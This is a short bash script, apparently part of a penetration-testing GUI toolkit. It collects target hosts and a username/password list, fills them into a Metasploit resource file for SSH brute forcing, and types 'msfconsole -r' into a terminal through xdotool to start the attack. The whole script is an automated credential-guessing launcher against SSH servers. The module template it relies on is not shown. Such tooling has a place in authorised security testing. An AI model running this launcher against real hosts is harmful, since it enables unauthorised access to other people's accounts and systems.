#!/bin/bash

: '
ssh: bruteforce userpass file (user pass)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
RHOSTS_FIELD=$(form_item  "RHOSTS" "RHOSTS")
USERPASS_FILE_FIELD=$(form_item  "USERPASS_FILE" "USERPASS_FILE")

# Generate GUI form
generate_form "${RHOSTS_FIELD}" "${USERPASS_FILE_FIELD}"

RHOSTS=${form_data["RHOSTS"]}
USERPASS_FILE=${form_data["USERPASS_FILE"]}

FILES_FOLDER="${SCRIPTS_DIR}/ssh/.files"

# Define replacement fields
REPLACE_FIELDS=(
    "[USERPASS_FILE]" "${USERPASS_FILE}"
    "[RHOSTS]" "${RHOSTS}"
)

find_and_replace_file "${FILES_FOLDER}" "msfconsole_brute_force_ssh_userpass_file" "${REPLACE_FIELDS[@]}"

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return